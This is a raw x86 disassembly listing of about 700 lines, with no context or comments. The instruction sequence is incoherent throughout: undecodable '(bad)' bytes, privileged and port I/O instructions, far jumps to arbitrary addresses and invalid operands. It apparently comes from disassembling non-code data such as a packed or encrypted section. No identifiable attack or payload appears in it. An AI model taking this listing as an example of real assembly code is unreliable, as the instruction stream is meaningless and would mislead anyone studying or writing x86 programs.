  417ab3:	cmp    bl,BYTE PTR [esi+ebx*1]
  417ab6:	fwait
  417ab7:	mov    edx,0x77e7af2b
  417abc:	retf   
  417abd:	sub    al,BYTE PTR [ecx-0x5]
  417ac0:	pop    edi
  417ac1:	out    dx,al
  417ac2:	xchg   esp,eax
  417ac3:	(bad)  
  417ac4:	lods   eax,DWORD PTR ds:[esi]
  417ac5:	sub    eax,0xa392cfd7
  417aca:	push   0xd0ce2c0f
  417acf:	push   edx
  417ad0:	cmp    dl,BYTE PTR [esi+0xd010dab]
  417ad6:	cmp    eax,0x1fb40081
  417adb:	enter  0x6672,0x92
  417adf:	sub    DWORD PTR [edx+0x41],esi
  417ae2:	test   eax,0x45e07587
  417ae7:	ins    DWORD PTR es:[edi],dx
  417ae8:	mov    esi,0x393ad390
  417aed:	or     BYTE PTR [esp+ecx*2],0xdb
  417af1:	mov    ebp,0xcca89c8e
  417af6:	push   cs
  417af7:	icebp  
  417af8:	imul   esp,esp,0x3
  417afb:	mov    ecx,0x53f9355c
  417b00:	xlat   BYTE PTR ds:[ebx]
  417b01:	jmp    0x779163ce
  417b06:	outs   dx,BYTE PTR ds:[esi]
  417b07:	jo     0x417b65
  417b09:	addr16 pushf 
  417b0b:	push   ebp
  417b0c:	push   ecx
  417b0d:	leave  
  417b0e:	push   ebp
  417b0f:	fiadd  WORD PTR [ebp+0x7eddcb5f]
  417b15:	and    DWORD PTR [ecx+ecx*1+0x7d],0xffffff93
  417b1a:	cmp    eax,esi
  417b1c:	rol    DWORD PTR [ecx],cl
  417b1e:	dec    esi
  417b1f:	cmp    ecx,DWORD PTR [edx]
  417b21:	ret    0xeee3
  417b24:	adc    BYTE PTR [ebp+0x59c96383],bl
  417b2a:	mov    cs,WORD PTR [eax+0x1]
  417b2d:	out    0x96,eax
  417b2f:	push   0xff9f32e1
  417b34:	or     eax,0xc361c16c
  417b39:	inc    ecx
  417b3a:	pop    ds
  417b3b:	(bad)  
  417b3c:	in     eax,0x54
  417b3e:	int3   
  417b3f:	sbb    BYTE PTR [edi+0x1e],ch
  417b42:	jo     0x417ba6
  417b44:	pusha  
  417b45:	outs   dx,DWORD PTR ds:[esi]
  417b46:	jb     0x417bbc
  417b48:	fnsave [edi]
  417b4a:	cs and al,0x1
  417b4d:	push   ss
  417b4e:	aaa    
  417b4f:	and    BYTE PTR [ecx],cl
  417b51:	jno    0x417b64
  417b53:	cmp    esi,edi
  417b55:	les    ebx,FWORD PTR ds:0xd9a86a7a
  417b5b:	into   
  417b5c:	adc    al,0x77
  417b5e:	and    ah,BYTE PTR [ebx]
  417b60:	cmp    BYTE PTR [ecx-0x57],bh
  417b63:	hlt    
  417b64:	ds (bad) 
  417b66:	sbb    al,0xd5
  417b68:	fst    QWORD PTR [esi]
  417b6a:	jmp    0xacaa1a30
  417b6f:	outs   dx,BYTE PTR ds:[esi]
  417b70:	rcr    BYTE PTR [ecx-0x5],0xda
  417b74:	daa    
  417b75:	mov    cs,WORD PTR [ebp-0x6d797b3a]
  417b7b:	or     DWORD PTR [eax-0x72],ebx
  417b7e:	pop    ss
  417b7f:	mov    esi,tr7
  417b82:	sub    al,0xc9
  417b84:	jp     0x417b32
  417b86:	dec    esi
  417b87:	and    al,BYTE PTR [edx-0x7e4eeee7]
  417b8d:	lahf   
  417b8e:	sbb    bl,BYTE PTR [edx-0x71]
  417b91:	or     DWORD PTR [ebx+0x35d79087],esp
  417b97:	out    dx,al
  417b98:	xor    eax,edx
  417b9a:	call   0xecf4:0x2f9ea0a
  417ba1:	mov    esp,0x887efe7b
  417ba6:	ss jne 0x417b31
  417ba9:	mov    DWORD PTR [esi-0x649b0a0a],esp
  417baf:	cmp    eax,0xeaba3892
  417bb4:	(bad)  
  417bb6:	jl     0x417bbf
  417bb8:	sbb    al,0x1a
  417bba:	loope  0x417b9e
  417bbc:	inc    eax
  417bbd:	loop   0x417ba6
  417bbf:	sub    BYTE PTR [ebx+ecx*4+0x33],bh
  417bc3:	sub    al,0xc9
  417bc5:	std    
  417bc6:	mov    DWORD PTR [edi],ebx
  417bc8:	int3   
  417bc9:	int3   
  417bca:	jl     0x417c38
  417bcc:	sub    DWORD PTR [esi],ecx
  417bce:	jb     0x417bda
  417bd0:	jno    0x417bff
  417bd2:	mov    edx,0x9532e687
  417bd7:	sbb    ebx,DWORD PTR [edx]
  417bd9:	call   0xb95bad25
  417bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bdf:	fcomp  QWORD PTR [esp+esi*8+0x251b76a6]
  417be6:	push   es
  417be7:	mov    ecx,0x36c72a51
  417bec:	and    BYTE PTR [ecx],dh
  417bee:	sub    eax,0x45e88aa2
  417bf3:	xor    DWORD PTR [ebp+0x6d],eax
  417bf6:	mov    esi,0x331a0e57
  417bfb:	push   esi
  417bfc:	js     0x417c69
  417bfe:	push   esi
  417bff:	int    0xcc
  417c01:	fistp  WORD PTR es:[esi+0x7a]
  417c05:	jne    0x417bba
  417c07:	scas   eax,DWORD PTR es:[edi]
  417c08:	call   DWORD PTR [edx]
  417c0a:	shr    BYTE PTR [ebp-0x5026457b],1
  417c10:	int    0xf8
  417c12:	add    al,dl
  417c14:	jns    0x417c43
  417c16:	repz leave 
  417c18:	clc    
  417c19:	cmp    eax,0x11a39082
  417c1e:	sbb    BYTE PTR [esi-0x50],ch
  417c21:	cmp    DWORD PTR [edi+ebx*8+0x64],esi
  417c25:	mov    al,0x73
  417c27:	mov    esi,0xa4e01113
  417c2c:	iret   
  417c2d:	jnp    0x417bf0
  417c2f:	test   BYTE PTR [edx+0x47],dl
  417c32:	pop    esi
  417c33:	mov    eax,0xe89f4453
  417c38:	jmp    FWORD PTR [ebx]
  417c3a:	dec    ebx
  417c3b:	cs inc esi
  417c3d:	jns    0x417c71
  417c3f:	inc    esi
  417c40:	xchg   ebx,eax
  417c41:	cmp    BYTE PTR [ebx],al
  417c43:	outs   dx,DWORD PTR ds:[esi]
  417c44:	sar    DWORD PTR [ebx-0x3f],0xe5
  417c48:	retf   
  417c49:	cmp    ah,al
  417c4b:	jg     0x417cc7
  417c4d:	and    BYTE PTR [eax-0x27eedb38],bh
  417c53:	cli    
  417c54:	loop   0x417cb8
  417c56:	push   0x24f38c05
  417c5b:	loopne 0x417bfe
  417c5d:	xchg   bh,dh
  417c5f:	dec    ebx
  417c60:	ss jns 0x417c8e
  417c63:	cmp    DWORD PTR [eax+0x5b182396],esi
  417c69:	xchg   ecx,eax
  417c6a:	jo     0x417c52
  417c6c:	out    0xfd,eax
  417c6e:	lock into 
  417c70:	ins    BYTE PTR es:[edi],dx
  417c71:	adc    DWORD PTR [ebx],ebp
  417c73:	mov    ds:0xc433c088,al
  417c78:	push   0xffffff8e
  417c7a:	mov    cl,0xa
  417c7c:	push   0x7
  417c7e:	test   ebx,ebp
  417c80:	(bad)  
  417c81:	mov    WORD PTR [eax],fs
  417c83:	or     eax,0xafadeb97
  417c88:	mov    eax,ds:0x8c36aa8d
  417c8d:	pusha  
  417c8e:	mov    esp,0x947fda76
  417c93:	out    0x7d,al
  417c95:	xchg   BYTE PTR [ebp-0x3f8aae2a],ch
  417c9b:	loope  0x417c69
  417c9d:	sbb    eax,0x6d105e6e
  417ca2:	gs stos BYTE PTR es:[edi],al
  417ca4:	jns    0x417cca
  417ca6:	out    0x10,eax
  417ca8:	jae    0x417cbb
  417caa:	jmp    0xd6ea2372
  417caf:	(bad)  
  417cb0:	rcr    esp,cl
  417cb2:	lods   al,BYTE PTR ds:[esi]
  417cb3:	shl    DWORD PTR [eax],cl
  417cb5:	pop    ecx
  417cb6:	(bad)  
  417cb7:	fistp  DWORD PTR [esi]
  417cb9:	(bad)  
  417cbb:	pop    edx
  417cbc:	cmp    eax,0xf2d6952
  417cc1:	or     BYTE PTR [esi-0x14],al
  417cc4:	mov    ah,0xe0
  417cc6:	add    esi,DWORD PTR [ebp-0xa463cb6]
  417ccc:	mov    WORD PTR es:[edx+0x37],?
  417cd0:	xlat   BYTE PTR ds:[ebx]
  417cd1:	retf   0x7e64
  417cd4:	mov    ?,WORD PTR [ebx]
  417cd6:	mov    edi,0xf1b00c66
  417cdb:	sub    al,0xa5
  417cdd:	idiv   ah
  417cdf:	push   0xffffffc5
  417ce1:	sbb    al,ch
  417ce3:	ret    0x6a76
  417ce6:	mov    dl,0x8e
  417ce8:	int3   
  417ce9:	or     al,0x70
  417ceb:	out    0x70,eax
  417ced:	fbld   TBYTE PTR [edx+0x42]
  417cf0:	mov    ebp,0xb2a5b518
  417cf5:	adc    BYTE PTR [ebp+eax*8+0x3d],ah
  417cf9:	xchg   esp,eax
  417cfa:	mov    edi,0x15410f1a
  417cff:	mov    bh,bl
  417d01:	inc    ebx
  417d02:	push   edi
  417d03:	sbb    BYTE PTR [esi+0x77c4a5de],bl
  417d09:	mov    eax,ds:0xc7ee2fb9
  417d0e:	push   0xffffff9a
  417d10:	stos   BYTE PTR es:[edi],al
  417d11:	add    al,0x68
  417d13:	xor    BYTE PTR [edx],ah
  417d15:	cdq    
  417d16:	or     eax,0x655c0ec4
  417d1b:	adc    BYTE PTR [ecx],al
  417d1d:	and    al,BYTE PTR [ecx]
  417d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d20:	scas   al,BYTE PTR es:[edi]
  417d21:	jmp    0x417ccf
  417d23:	inc    esp
  417d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d25:	in     al,dx
  417d26:	cli    
  417d27:	je     0x417d10
  417d29:	(bad)  
  417d2a:	hlt    
  417d2b:	or     DWORD PTR fs:[ebp-0x6dd3254c],esp
  417d32:	in     eax,dx
  417d33:	push   edi
  417d34:	(bad)  
  417d35:	ror    cl,0x9d
  417d38:	(bad)  
  417d39:	jnp    0x417da5
  417d3b:	add    DWORD PTR [edi-0x80],ecx
  417d3e:	shr    DWORD PTR [edi+esi*2-0x70],cl
  417d42:	jmp    0x825017f4
  417d47:	adc    ch,BYTE PTR [ecx]
  417d49:	test   al,0x5b
  417d4b:	data16 test al,0xbd
  417d4e:	adc    al,0x1d
  417d50:	add    eax,0x32bbe14d
  417d55:	inc    edi
  417d56:	push   edi
  417d57:	(bad)  
  417d58:	mov    dl,0x3c
  417d5a:	sub    ebp,DWORD PTR [edi-0x6270392c]
  417d60:	fst    QWORD PTR [eax+0x713402f3]
  417d66:	shl    DWORD PTR [edi],cl
  417d68:	ret    
  417d69:	add    al,0xaf
  417d6b:	gs sub ch,bh
  417d6e:	xchg   ebp,eax
  417d6f:	and    DWORD PTR [ebp-0x71d2b528],ebx
  417d75:	sbb    bl,BYTE PTR [edx+0x20654e68]
  417d7b:	shl    BYTE PTR [ecx-0xe],0xa
  417d7f:	adc    BYTE PTR [ebx],ah
  417d81:	jne    0x417dda
  417d83:	xlat   BYTE PTR ds:[ebx]
  417d84:	push   edi
  417d85:	std    
  417d86:	out    0xf4,eax
  417d88:	push   0xfffffff0
  417d8a:	mov    WORD PTR [edi+edx*2+0x27],gs
  417d8e:	pmaxsw mm5,QWORD PTR cs:[ebp-0x33]
  417d93:	sub    DWORD PTR [edi+0xf3c1eb8],ebx
  417d99:	fisubr WORD PTR [eax]
  417d9b:	mov    ss,WORD PTR [bx+si-0x5d]
  417d9f:	ins    DWORD PTR es:[edi],dx
  417da0:	or     DWORD PTR [esp+ebx*1+0x6f2cc3dd],esp
  417da7:	or     ebp,DWORD PTR [ebx+esi*2]
  417daa:	dec    ebx
  417dab:	xor    cl,BYTE PTR [eax+0x8d6510f]
  417db1:	sbb    DWORD PTR cs:[eax+0xd],edx
  417db5:	jae    0x417d3d
  417db7:	dec    ecx
  417db8:	rcl    edx,0xe
  417dbb:	mov    DWORD PTR [edi-0x4b],0xb73ab31c
  417dc2:	and    ecx,esp
  417dc4:	aad    0xfd
  417dc6:	cdq    
  417dc7:	outs   dx,BYTE PTR ds:[esi]
  417dc8:	cmp    DWORD PTR [edi],edx
  417dca:	xor    ebx,DWORD PTR [edi+0x5d77a638]
  417dd0:	and    eax,0xacc09823
  417dd5:	ficomp DWORD PTR [edi+ecx*4-0x59654c95]
  417ddc:	push   ebp
  417ddd:	inc    ecx
  417dde:	mov    ds:0x7f691a6a,al
  417de3:	lea    edx,[eax+0x76]
  417de6:	out    dx,eax
  417de7:	mov    edi,0x7214d93b
  417dec:	mov    ebx,0x8994f8b1
  417df1:	test   al,0xc8
  417df3:	or     dh,BYTE PTR [ebp+0x3f]
  417df6:	cmp    bl,BYTE PTR [ebx]
  417df8:	and    DWORD PTR [esi+ecx*1-0x233d8e1d],ecx
  417dff:	or     eax,0xf14a4c2c
  417e04:	xchg   DWORD PTR [ebx],esi
  417e06:	pop    esp
  417e07:	es ds mov edx,0x2fc03851
  417e0e:	int    0x13
  417e10:	cld    
  417e11:	imul   esp,ecx,0x26
  417e14:	push   ss
  417e15:	mul    BYTE PTR [edx]
  417e17:	lods   al,BYTE PTR ds:[esi]
  417e18:	out    dx,al
  417e19:	rcl    BYTE PTR [eax-0x42],0xc6
  417e1d:	or     ebx,ebp
  417e1f:	sub    al,0xfd
  417e21:	sbb    DWORD PTR [edi],edx
  417e23:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417e25:	stos   DWORD PTR es:[edi],eax
  417e26:	mov    ebx,0xad04fbea
  417e2b:	lds    esp,FWORD PTR [ecx-0x15537d2d]
  417e31:	nop
  417e32:	pop    ebx
  417e33:	in     eax,dx
  417e34:	fistp  QWORD PTR [edi-0xf]
  417e37:	into   
  417e38:	or     ebp,0xac8657ce
  417e3e:	lods   al,BYTE PTR ds:[esi]
  417e3f:	shr    ebp,cl
  417e41:	jb     0x417ded
  417e43:	lods   al,BYTE PTR ds:[esi]
  417e44:	daa    
  417e45:	cmp    ch,BYTE PTR [ebp+0x60d007b4]
  417e4b:	data16 fwait
  417e4d:	mov    cl,bl
  417e4f:	cmp    al,0x3a
  417e51:	gs push ecx
  417e53:	in     al,dx
  417e54:	ins    BYTE PTR es:[edi],dx
  417e55:	(bad)  
  417e56:	cs push esi
  417e58:	xchg   BYTE PTR [eax+0x3b],dl
  417e5b:	jl     0x417e32
  417e5d:	dec    esi
  417e5e:	test   eax,0xccaa2b42
  417e63:	popa   
  417e64:	push   es
  417e65:	cmp    al,0x8
  417e67:	jae    0x417e11
  417e69:	iret   
  417e6a:	mov    eax,0xfa40fc86
  417e6f:	(bad)  
  417e70:	jo     0x417e9e
  417e72:	in     al,dx
  417e73:	aad    0xe3
  417e75:	jp     0x417e4e
  417e77:	push   esp
  417e78:	ret    
  417e79:	test   DWORD PTR [esi+0x3f],ecx
  417e7c:	mov    eax,ds:0xa39064db
  417e81:	xor    DWORD PTR [esi+0x3d],ebx
  417e84:	pushf  
  417e85:	jbe    0x417e4d
  417e87:	dec    ebp
  417e88:	leave  
  417e89:	ret    0x2c6c
  417e8c:	shl    BYTE PTR [ebx],cl
  417e8e:	idiv   ch
  417e90:	mul    ch
  417e92:	push   ebx
  417e93:	loope  0x417ebc
  417e95:	pushf  
  417e96:	xchg   ecx,eax
  417e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e98:	sbb    eax,0x1d5d4c8d
  417e9d:	mov    ch,0x1f
  417e9f:	mov    cl,0xe6
  417ea1:	test   DWORD PTR [edx],esi
  417ea3:	and    esp,DWORD PTR [ecx+0x37750a9b]
  417ea9:	bound  esp,QWORD PTR [edi]
  417eab:	jne    0x417eec
  417ead:	adc    BYTE PTR [edx+0x73],ah
  417eb0:	outs   dx,DWORD PTR ds:[esi]
  417eb1:	(bad)  
  417eb2:	stos   BYTE PTR es:[edi],al
  417eb3:	in     eax,dx
  417eb4:	aas    
  417eb5:	inc    ebp
  417eb6:	test   BYTE PTR [ecx],ah
  417eb8:	xchg   esp,eax
  417eb9:	xchg   esi,eax
  417eba:	idiv   BYTE PTR [ebp-0x6a]
  417ebd:	add    DWORD PTR [ecx],ebp
  417ebf:	in     eax,dx
  417ec0:	push   cs
  417ec1:	dec    eax
  417ec2:	sbb    eax,0x9b48ae4e
  417ec7:	cmc    
  417ec8:	cmp    DWORD PTR [esi],0xffffffd2
  417ecb:	mov    cl,0x57
  417ecd:	xchg   ebp,eax
  417ece:	mov    al,fs:0x664ae49c
  417ed4:	mov    ch,0x90
  417ed6:	mov    bl,0x2c
  417ed8:	dec    edi
  417ed9:	pop    ebp
  417eda:	mov    eax,0x7330f003
  417edf:	dec    eax
  417ee0:	add    bh,BYTE PTR [esi]
  417ee2:	dec    edi
  417ee3:	clc    
  417ee4:	cmp    esi,DWORD PTR [ebp-0x55398bd7]
  417eea:	mov    ch,0x98
  417eec:	stos   BYTE PTR es:[edi],al
  417eed:	(bad)  
  417eee:	inc    eax
  417eef:	mov    DWORD PTR [ecx+0x22],esp
  417ef2:	inc    ecx
  417ef3:	rcr    edx,cl
  417ef5:	cmp    DWORD PTR [ecx-0xf719fd9],ebx
  417efb:	jmp    0x6f1f6d39
  417f00:	and    DWORD PTR [esi+eiz*4],edx
  417f03:	js     0x417f26
  417f05:	leave  
  417f06:	mov    ebx,0x98dd8bbd
  417f0b:	push   edi
  417f0c:	sub    ecx,edi
  417f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f0f:	scas   eax,DWORD PTR es:[edi]
  417f10:	repnz cli 
  417f12:	xor    ecx,0xffffffc3
  417f15:	cld    
  417f16:	sahf   
  417f17:	dec    ecx
  417f18:	sbb    edi,ebx
  417f1a:	xor    al,0x5d
  417f1c:	call   0xcd605077
  417f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f22:	lea    ecx,[ebp-0x693741a2]
  417f28:	inc    edi
  417f29:	pop    ds
  417f2a:	vpandn ymm4,ymm0,YMMWORD PTR [edx]
  417f2e:	jbe    0x417f6f
  417f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f31:	imul   edi,DWORD PTR [esp+eax*1-0x6f41cc36],0x31
  417f39:	cmp    al,0x16
  417f3b:	loope  0x417f05
  417f3d:	mov    ds:0x3c8ac176,al
  417f42:	mov    ss,esi
  417f44:	imul   esi,DWORD PTR [eax],0xffffffb8
  417f47:	fwait
  417f48:	loop   0x417f45
  417f4a:	add    al,0xe3
  417f4c:	je     0x417f7c
  417f4e:	fstp   QWORD PTR ds:0xef2c401c
  417f54:	rcr    BYTE PTR [esp+eiz*4+0x11],0x50
  417f59:	xchg   edi,eax
  417f5a:	add    al,0xd8
  417f5c:	mov    dh,0xc0
  417f5e:	lds    esi,FWORD PTR [eax+0x1d]
  417f61:	std    
  417f62:	and    al,0xdc
  417f64:	(bad)  
  417f65:	cld    
  417f66:	hlt    
  417f67:	mov    ah,0xc5
  417f69:	outs   dx,BYTE PTR ds:[esi]
  417f6a:	sub    eax,0x744ac5e0
  417f6f:	jnp    0x417fe0
  417f71:	(bad)  
  417f72:	sar    DWORD PTR [esi+0x3b3a4f26],1
  417f78:	sbb    eax,DWORD PTR [edi-0x13]
  417f7b:	dec    eax
  417f7c:	jle    0x417f8d
  417f7e:	call   0x9cfd54a4
  417f83:	pushf  
  417f84:	fucomip st,st(7)
  417f86:	xchg   DWORD PTR [ebx+0x32],eax
  417f89:	and    DWORD PTR [eax-0x683b83de],edx
  417f8f:	mov    ebp,0xc64923cb
  417f94:	pop    ds
  417f95:	add    al,cl
  417f97:	mov    ds:0x99b76b25,al
  417f9c:	mov    ?,WORD PTR [esi]
  417f9e:	stos   BYTE PTR es:[edi],al
  417f9f:	in     eax,dx
  417fa0:	fiadd  WORD PTR [ebp-0x4ef781ab]
  417fa6:	cmp    al,0xca
  417fa8:	fimul  WORD PTR ds:[ecx]
  417fab:	lock inc esp
  417fad:	mov    edx,0x7ce1daa5
  417fb2:	addr16 cdq 
  417fb4:	xor    BYTE PTR [ebx-0x52a97f69],cl
  417fba:	test   al,0xe4
  417fbc:	and    ebp,edi
  417fbe:	jnp    0x417f4c
  417fc0:	add    al,0x4f
  417fc2:	ds mov ebx,0x7e2984cb
  417fc8:	or     bl,BYTE PTR [edx+eiz*4+0x11]
  417fcc:	mov    edi,0x27f9b046
  417fd1:	jecxz  0x417f8c
  417fd3:	push   cs
  417fd4:	mov    ecx,0xe1f95352
  417fd9:	adc    DWORD PTR [esi-0x7b],ebx
  417fdc:	repz dec esi
  417fde:	dec    ecx
  417fdf:	sub    eax,DWORD PTR [esi]
  417fe1:	fcom   DWORD PTR [eax+esi*1+0x59]
  417fe5:	xor    esi,ebx
  417fe7:	dec    ebx
  417fe8:	lods   al,BYTE PTR ds:[esi]
  417fe9:	push   ebp
  417fea:	in     eax,0xf
  417fec:	out    dx,eax
  417fed:	ret    
  417fee:	cli    
  417fef:	fldenv [edi+ebx*4]
  417ff2:	dec    eax
  417ff3:	xchg   BYTE PTR gs:[edi],bl
  417ff6:	(bad)  
  417ff7:	out    0x63,al
  417ff9:	daa    
  417ffa:	in     al,dx
  417ffb:	ins    DWORD PTR es:[edi],dx
  417ffc:	stos   BYTE PTR es:[edi],al
  417ffd:	jle    0x417f8d
  417fff:	and    ebx,ecx
  418001:	add    ch,BYTE PTR [edx+0x508ba27c]
  418007:	pop    ds
  418008:	mov    ebp,0x409384d0
  41800d:	dec    esp
  41800e:	inc    eax
  41800f:	je     0x418069
  418011:	sub    DWORD PTR [ebp-0x14],esp
  418014:	or     bl,cl
  418016:	xchg   esi,eax
  418017:	jbe    0x41803a
  418019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801a:	pop    ebp
  41801b:	jmp    0x418041
  41801d:	pop    ds
  41801e:	sub    al,0xe0
  418020:	aad    0x57
  418022:	arpl   WORD PTR [ecx-0x27a0f7c7],bp
  418028:	lods   al,BYTE PTR ds:[esi]
  418029:	rcpps  xmm7,xmm0
  41802c:	mov    esi,0xa18a5812
  418031:	sbb    al,BYTE PTR [edx]
  418033:	and    al,0x6a
  418035:	add    BYTE PTR [edx+eax*2],ah
  418038:	ins    DWORD PTR es:[edi],dx
  418039:	out    dx,eax
  41803a:	scas   eax,DWORD PTR es:[edi]
  41803b:	out    0x11,eax
  41803d:	ret    
  41803e:	jmp    0x37429063
  418043:	and    DWORD PTR [edi-0x53],esp
  418046:	jp     0x417feb
  418048:	mov    esp,0x2fb399d
  41804d:	mov    al,ds:0x72727525
  418052:	jb     0x417ff3
  418054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418055:	dec    ebp
  418056:	dec    esp
  418057:	into   
  418058:	sbb    DWORD PTR [ebp+eax*4+0xf81cf40],edi
  41805f:	pop    esp
  418060:	inc    esp
  418061:	inc    ecx
  418062:	scas   eax,DWORD PTR es:[edi]
  418063:	std    
  418064:	pop    ebx
  418065:	cmp    edx,edx
  418067:	scas   eax,DWORD PTR es:[edi]
  418068:	inc    esp
  418069:	call   0x4cbd:0x65721f56
  418070:	push   0x61
  418072:	push   esi
  418073:	pop    ss
  418074:	in     eax,dx
  418075:	ret    
  418076:	push   cs
  418077:	arpl   WORD PTR [ebp+0x5c],bx
  41807a:	rcl    BYTE PTR [eax+edx*8],cl
  41807d:	nop
  41807e:	fisttp QWORD PTR [ebx+0x65]
  418081:	aaa    
  418082:	ins    DWORD PTR es:[edi],dx
  418083:	lds    edi,FWORD PTR [ecx-0x4a]
  418086:	mov    ds:0xb724c8df,al
  41808b:	add    bl,BYTE PTR [eax+0x24dc79f7]
  418091:	in     eax,0xde
  418093:	cmp    BYTE PTR [eax-0x1b],dh
  418096:	adc    al,0xd6
  418098:	xchg   DWORD PTR [esi],ebx
  41809a:	mov    bl,0xba
  41809c:	dec    edi
  41809d:	or     ch,BYTE PTR [edi+0x5186d6fb]
  4180a3:	popa   
  4180a4:	mov    ds:0x57dd1ee5,eax
  4180a9:	or     cl,BYTE PTR [esi]
  4180ab:	dec    edx
  4180ac:	and    BYTE PTR [eax+0x4abdf4b2],0xcf
  4180b3:	jb     0x41809f
  4180b5:	dec    ebx
  4180b6:	cmc    
  4180b7:	in     eax,dx
  4180b8:	adc    DWORD PTR [edx+esi*1-0x57],0xffffffd4
  4180bd:	imul   edi,DWORD PTR [ebx+0x384eb824],0x10f347e3
  4180c7:	inc    ebx
  4180c8:	scas   al,BYTE PTR es:[edi]
  4180c9:	xchg   edi,eax
  4180ca:	hlt    
  4180cb:	mul    esi
  4180cd:	shr    DWORD PTR [ebp+0x3004073e],1
  4180d3:	cld    
  4180d4:	sub    ecx,edi
  4180d6:	jnp    0x418146
  4180d8:	clc    
  4180d9:	(bad)  
  4180da:	jne    0x4180fd
  4180dc:	cmp    DWORD PTR [eax-0x5b],esi
  4180df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180e0:	lods   eax,DWORD PTR ds:[esi]
  4180e1:	int3   
  4180e2:	push   ds
  4180e3:	jmp    0x896628a7
  4180e8:	push   esp
  4180e9:	fcomp  QWORD PTR [ecx+0x23]
  4180ec:	jns    0x4180ca
  4180ee:	loope  0x4180ab
  4180f0:	ja     0x4180d4
  4180f2:	pop    es
  4180f3:	xor    eax,0x34cfa3d4
  4180f8:	jle    0x418160
  4180fa:	call   0xeb69:0x81e703bd
  418101:	(bad)  
  418103:	push   ds
  418104:	mov    eax,ds:0xfafb7c82
  418109:	mov    ah,0x21
  41810b:	jmp    0x6bd0:0xc87a84b6
  418112:	daa    
  418113:	ins    DWORD PTR es:[edi],dx
  418114:	or     eax,0xcc30f623
  418119:	test   BYTE PTR [ebx],cl
  41811b:	cmp    BYTE PTR [ebp+0x71],dl
  41811e:	and    dh,BYTE PTR [esi+0x35]
  418121:	inc    eax
  418122:	stos   DWORD PTR es:[edi],eax
  418123:	adc    DWORD PTR [eax+0x508b3e3],esp
  418129:	aaa    
  41812a:	add    edx,DWORD PTR [ecx-0x17e4e14d]
  418130:	sub    BYTE PTR [edi],bl
  418132:	jl     0x4180f0
  418134:	addr16 out 0x4,al
  418137:	xor    esi,DWORD PTR [ebx-0x16]
  41813a:	lds    eax,FWORD PTR [edi+eax*1]
  41813d:	popf   
  41813e:	pop    ecx
  41813f:	cmp    BYTE PTR [eax-0x7a068914],ah
  418145:	mov    esp,0x8774f2dc
  41814a:	mov    BYTE PTR [ecx+0x75],ah
  41814d:	xor    edx,0x68d09a9c
  418153:	ins    BYTE PTR es:[edi],dx
  418154:	rcl    DWORD PTR ds:0x8f08f09,cl
  41815a:	xchg   edx,eax
  41815b:	dec    esi
  41815c:	icebp  
  41815d:	add    DWORD PTR ds:0x142beca9,ebx
  418163:	retf   0x8ed4
  418166:	add    eax,0xe7c5c190
  41816b:	loop   0x4181db
  41816d:	fdivr  QWORD PTR [ecx-0x3704e87c]
  418173:	popf   
  418174:	rol    BYTE PTR [edx-0x370ca549],cl
  41817a:	mov    fs,esp
  41817c:	mov    ss,edi
  41817e:	jmp    0x41811b
  418180:	cdq    
  418181:	and    BYTE PTR [ebx],bl
  418183:	retf   0xc0fd
  418186:	call   DWORD PTR [eax-0x26]
  418189:	inc    esi
  41818a:	or     eax,0x32fdf879
  41818f:	test   BYTE PTR [ebp+0x19a7f8aa],al
  418195:	pop    esp
  418196:	lods   al,BYTE PTR ds:[esi]
  418197:	mov    esp,0x65bc6efc
  41819c:	inc    esi
  41819d:	xor    DWORD PTR [ebp-0x1],eax
  4181a0:	ror    dh,1
  4181a2:	js     0x418143
  4181a4:	pop    ecx
  4181a5:	cmp    BYTE PTR [ebx+eiz*1+0x28],bh
  4181a9:	mov    ch,0x25
  4181ab:	xchg   esp,eax
  4181ac:	jae    0x418166
  4181ae:	mov    al,ds:0x615e188f
  4181b3:	idiv   eax
  4181b5:	mov    ecx,0x87dd4052
  4181ba:	add    eax,0x57075aa4
  4181bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181c0:	mov    BYTE PTR [ecx+0x36],dl
  4181c3:	sbb    ebp,ebx
  4181c5:	jne    0x4181a6
  4181c7:	add    ch,BYTE PTR [esi+0x7b7e608c]
  4181cd:	les    ebx,FWORD PTR [esi-0x64]
  4181d0:	add    BYTE PTR [ebp+0x129b3fba],dl
  4181d6:	mov    edi,es
  4181d8:	ins    DWORD PTR es:[edi],dx
  4181d9:	mov    ebp,0x5156ba0e
  4181de:	jb     0x418253
  4181e0:	xchg   BYTE PTR ds:0x40dbe283,cl
  4181e6:	test   eax,0x1b0584f6
  4181eb:	hlt    
  4181ec:	cmc    
  4181ed:	imul   eax,DWORD PTR gs:[ebx-0xc],0x1efa88b
  4181f5:	je     0x418178
  4181f7:	or     DWORD PTR [esi+ecx*8-0x2b],eax
  4181fb:	test   BYTE PTR [ebx+0x51893ee3],bl
  418201:	jne    0x418228
  418203:	lea    eax,[esi+0x3c]
  418206:	mov    ?,edi
  418208:	dec    ebx
  418209:	pop    ds
  41820a:	mov    esp,0xfec6eda4
  41820f:	push   eax
  418210:	and    eax,0xc3455b30
  418215:	jne    0x4181d9
  418217:	mov    dh,0x5f
  418219:	adc    eax,0xc8708948
  41821e:	int3   
  41821f:	lods   al,BYTE PTR ds:[esi]
  418220:	mov    ebp,0x76542f15
  418225:	cmp    eax,DWORD PTR [ebp+0x3e]
  418228:	and    BYTE PTR [edi-0x4c83de8e],0x13
  41822f:	cmp    BYTE PTR [esi+0x78],dh
  418232:	js     0x4181ff
  418234:	je     0x418286
  418236:	inc    ebx
  418237:	das    
  418238:	in     eax,dx
  418239:	pop    ebx
  41823a:	sub    al,0x8b
  41823c:	jo     0x418203
  41823e:	mov    eax,gs:0x2571974c
  418244:	js     0x41820e
  418246:	dec    eax
  418247:	mov    esp,0x88115892
  41824c:	ror    DWORD PTR [esi+0x30],1
  41824f:	loop   0x4181f9
  418251:	std    
  418252:	shl    ebx,cl
  418254:	or     esi,edx
  418256:	inc    edx
